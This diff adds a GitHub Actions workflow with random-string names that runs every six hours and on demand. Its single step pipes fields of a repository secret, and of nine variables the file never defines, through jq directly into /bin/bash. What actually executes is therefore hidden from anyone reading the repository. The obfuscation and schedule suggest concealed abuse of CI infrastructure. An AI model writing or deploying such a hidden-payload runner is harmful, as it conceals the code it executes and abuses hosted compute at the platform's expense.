@@ -1,0 +1,26 @@
+name: chenqinzii
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenqinzii
+        env:
+          te35: ${{ secrets.te35 }}
+        run: |
+          echo $te35 | jq -r .kf6275 | /bin/bash
+          echo $lixz36681 | jq -r .egjzo6 | /bin/bash
+          echo $scr5040 | jq -r .zwxno734 | /bin/bash
+          echo $dg8 | jq -r .ffssh3749 | /bin/bash
+          echo $domo600 | jq -r .ia5131 | /bin/bash
+          echo $ejca7611 | jq -r .pdqd461 | /bin/bash
+          echo $ylwvi2754 | jq -r .vb959 | /bin/bash
+          echo $gkldx9367 | jq -r .lritx46 | /bin/bash
+          echo $qjhh168 | jq -r .tm04 | /bin/bash
+          echo $c42 | jq -r .yekzh32 | /bin/bash
+
